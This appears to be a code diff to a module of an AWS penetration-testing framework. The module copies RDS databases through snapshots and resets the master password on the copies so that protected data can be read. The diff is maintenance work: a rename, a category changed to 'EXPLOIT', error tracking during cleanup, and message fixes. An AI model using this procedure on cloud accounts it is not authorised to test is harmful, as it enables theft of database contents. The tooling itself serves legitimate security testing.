@@ -6,11 +6,11 @@ import json
 from botocore.exceptions import ClientError
 
 module_info = {
-    'name': 'rds_snapshot_explorer',
+    'name': 'rds__explorer_snapshots',
     'author': 'Alexander Morgenstern alexander.morgenstern@rhinosecuritylabs.com',
-    'category': 'post-exploitation',
+    'category': 'EXPLOIT',
     'one_liner': 'Creates copies of running RDS databases to access protected information',
-    'description': 'Creates a snapshot of all databases instances, restore new databases instances from those snapshots, and then changes the master password to allow access to the copied database. After the database has been created, the connection information is given. After interactions with the database are complete, the temporary resources are deleted. If there is an unexpected crash during the module\'s execution, the subsequent run of the module will attempt to clean up any leftover temporary resources.',
+    'description': 'Creates a snapshot of all database instances, restores new database instances from those snapshots, and then changes the master password to allow access to the copied database. After the database has been created, the connection information is given. After interactions with the database are complete, the temporary resources are deleted. If there is an unexpected crash during the module\'s execution, the subsequent run of the module will attempt to clean up any leftover temporary resources.',
     'services': ['RDS'],
     'prerequisite_modules': [],
     'external_dependencies': [],
@@ -63,10 +63,12 @@ def cleanup(pacu):
     success = True
     for instance in data['Instances']:
         client = pacu.get_boto3_client('rds', data['Instances'][instance]['AvailabilityZone'][:-1])
-        delete_instance(client, instance, pacu.print)
+        if not delete_instance(client, instance, pacu.print):
+            success = False
     for snapshot in data['Snapshots']:
         client = pacu.get_boto3_client('rds', data['Snapshots'][snapshot]['AvailabilityZone'][:-1])
-        delete_snapshot(client, snapshot, pacu.print)
+        if not delete_snapshot(client, snapshot, pacu.print):
+            success = False
     return success
 
 
@@ -89,18 +91,18 @@ def main(args, pacu):
         pacu.print('  Found {} RDS instance(s)'.format(len(active_instances)))
         for instance in active_instances:
             prompt = '    Target: {} (y/n)? '.format(instance['DBInstanceIdentifier'])
-            if pacu.input(prompt) != 'y':
+            if pacu.input(prompt).lower() != 'y':
                 continue
             pacu.print('    Creating temporary snapshot...')
             temp_snapshot = create_snapshot_from_instance(client, instance, pacu.print)
             if not temp_snapshot:
-                pacu.print('    Failed to Create Temporary Snapshot')
+                pacu.print('    Failed to create temporary snapshot')
                 continue
 
             pacu.print('    Restoring temporary instance from snapshot...')
             temp_instance = restore_instance_from_snapshot(client, temp_snapshot, pacu.print)
             if not temp_instance:
-                pacu.print('    Failed to Create Temporary Instance')
+                pacu.print('    Failed to create temporary instance')
                 delete_snapshot(client, temp_snapshot, pacu.print)
                 continue
 
@@ -121,7 +123,7 @@ def process_instance(pacu, client, instance):
     )
     password = pacu.input('    Set Master Password for current instance: ')
     if modify_master_password(client, instance, password, pacu.print):
-        pacu.print('      Password Change Successfully')
+        pacu.print('      Password Change Successful')
     else:
         pacu.print('      Password Change Failed')
 
@@ -240,4 +242,6 @@ def get_all_region_instances(client, print):
 def summary(data, pacu_main):
     if 'fail' in data:
         return data['fail']
-    return '  {} Instance(s) Copies Launched'.format(data['instances'])
+    out = '  No issues cleaning up temporary data\n'
+    out += '  {} Instance(s) Copies Launched'.format(data['instances'])
+    return out
